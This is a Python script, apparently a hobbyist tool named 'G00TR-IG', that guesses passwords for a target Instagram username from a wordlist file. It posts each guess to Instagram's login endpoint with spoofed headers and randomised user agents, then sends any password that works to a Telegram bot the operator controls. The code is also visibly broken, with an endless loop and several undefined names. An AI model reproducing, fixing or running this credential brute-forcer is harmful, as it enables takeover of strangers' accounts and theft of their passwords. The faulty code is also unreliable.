import requests, random, pyfiglet
from user_agent import generate_user_agent
from time import sleep

#--------------------------------

Black="\033[1;30m"       # Black
Red="\033[1;31m"         # Red
Green="\033[1;32m"       # Green
Yellow="\033[1;33m"      # Yellow
Blue="\033[1;34m"        # Blue
Purple="\033[1;35m"      # Purple
Cyan="\033[1;36m"        # Cyan
White="\033[1;37m"       # White

#--------------------------------

logo = pyfiglet.figlet_format("G00TR-IG")
print(Blue+logo)

ID = input("[+] - Enter Your ID : ")
token = input("[+] - Enter Your Token BOT : ")

r = requests.Session()

file = input(Cyan+"[+] - Enter Name File : ")
rfile = open(file, "r")
us = input(Red+"[+] - Enter Username Target : ")
def check():
    while True:
        username = us
        password = rfile.readline().split('\n')[0]
        time.sleep(5)

    url = 'https://www.instagram.com/accounts/login/ajax/'
  
    headers = {'accept':'*/*',
         'accept-encoding':'gzip,deflate,br',
         'accept-language':'en-US,en;q=0.9,ar;q=0.8',
         'content-length':'269',
         'content-type':'application/x-www-form-urlencoded',
         'cookie':'ig_did=77A45489-9A4C-43AD-9CA7-FA3FAB22FE24;ig_nrcb=1;csrftoken=VOPH7fUUOP85ChEViZkd2PhLkUQoP8P8;mid=YGwlfgALAAEryeSgDseYghX2LAC-',
         'origin':'https://www.instagram.com',
         'referer':'https://www.instagram.com/',
         'sec-fetch-dest':'empty',
         'sec-fetch-mode':'cors',
         'sec-fetch-site':'same-origin',
         'user-agent':generate_user_agent(),
         'x-csrftoken':'VOPH7fUUOP85ChEViZkd2PhLkUQoP8P8',
         'x-ig-app-id':'936619743392459',
         'x-ig-www-claim':'0',
         'x-instagram-ajax':'8a8118fa7d40',
         'x-requested-with':'XMLHttpRequest'}         
         
    data = {'username':username,
         'enc_password':'#PWD_INSTAGRAM_BROWSER:0:1589682409:{}'.format(password),
         'queryParams':'{}',
         'optIntoOneTap':'false'}

    req_login = r.post(url,headers=headers, data=data, proxies=None)

    if "userid" in req_login.text:
        print(Green+"User name : "+username, Green+"Password : "+password)
        tlg = requests.post(f'''https://api.telegram.org/bot{tok}/sendMessage?chat_id={ID}&text={G}''')
        i = requests.post(tlg)

    else:
        print(Red+"Error : =password")
